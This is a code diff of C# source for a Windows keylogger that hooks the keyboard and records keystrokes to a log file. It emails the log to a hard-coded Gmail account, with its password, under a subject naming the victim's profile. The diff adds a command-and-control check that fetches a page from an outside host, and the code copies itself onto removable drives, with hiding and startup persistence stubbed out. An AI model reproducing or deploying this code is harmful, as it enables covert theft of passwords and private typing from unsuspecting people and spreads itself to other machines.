@@ -25,24 +25,33 @@ namespace Karios
             private static LowLevelKeyboardProc _proc = HookCallback;
             private static IntPtr _hookID = IntPtr.Zero;
 
-            public static void Main()
-            {
-                var handle = GetConsoleWindow();
+        public static void Main()
+        {
+            var handle = GetConsoleWindow();
 
-                // Hide
+            //start C&C func
+
+            WebClient wc = new WebClient();
+            string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
+            if (!webData.ToUpperInvariant().Contains("GoLogSomeKeys"))
+            {
+                // Hide the window
                 //ShowWindow(handle, SW_HIDE);
-                //copy app
+                // Persitance feature
                 //Duplicate();
-                //run on startup
+                // Run on startup
                 //SetStartup();
-                //beginS
+                // Start Applicatiom
                 _hookID = SetHook(_proc);
                 Application.Run();
                 UnhookWindowsHookEx(_hookID);
-
-
+            }
+            else
+            {
+                Console.WriteLine("Dosent work!");
             }
 
+        }
             private static IntPtr SetHook(LowLevelKeyboardProc proc)
             {
                 using (Process curProcess = Process.GetCurrentProcess())
@@ -61,7 +70,7 @@ namespace Karios
             {
                 if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                 {
-                    string appName = System.AppDomain.CurrentDomain.FriendlyName;
+                    string appName = AppDomain.CurrentDomain.FriendlyName;
                     int vkCode = Marshal.ReadInt32(lParam);
                     string fileName = DateTime.Now.ToString("yyyy-MM-dd");
                     // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
@@ -85,16 +94,16 @@ namespace Karios
                     {
                         MailMessage mail = new MailMessage();
                         SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
-                        mail.From = new MailAddress("jonesmiranda171@gmail.com");
-                        mail.To.Add("jonesmiranda171@gmail.com");
+                        mail.From = new MailAddress("GINGIRULES@gmail.com");
+                        mail.To.Add("GINGIRULES@gmail.com");
                         mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                         mail.Body = "New kelogging file from victim, finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
 
-                        System.Net.Mail.Attachment attachment;
-                        attachment = new System.Net.Mail.Attachment(pathToLog);
+                        Attachment attachment;
+                        attachment = new Attachment(pathToLog);
                         mail.Attachments.Add(attachment);
                         SmtpServer.Port = 587;
-                        SmtpServer.Credentials = new System.Net.NetworkCredential("jonesmiranda171@gmail.com", "ur password");
+                        SmtpServer.Credentials = new NetworkCredential("GINGIRULES@gmail.com", "G1ng1RuleS");
                         SmtpServer.EnableSsl = true;
                         SmtpServer.Send(mail);
                         //clear mail attachment
@@ -108,7 +117,7 @@ namespace Karios
                         {
                             if (d.DriveType == DriveType.Removable && d.IsReady)
                             {
-                                System.IO.File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName
+                                File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName
                                     , d.Name + @"\" + System.AppDomain.CurrentDomain.FriendlyName, true);
                             }
                         }
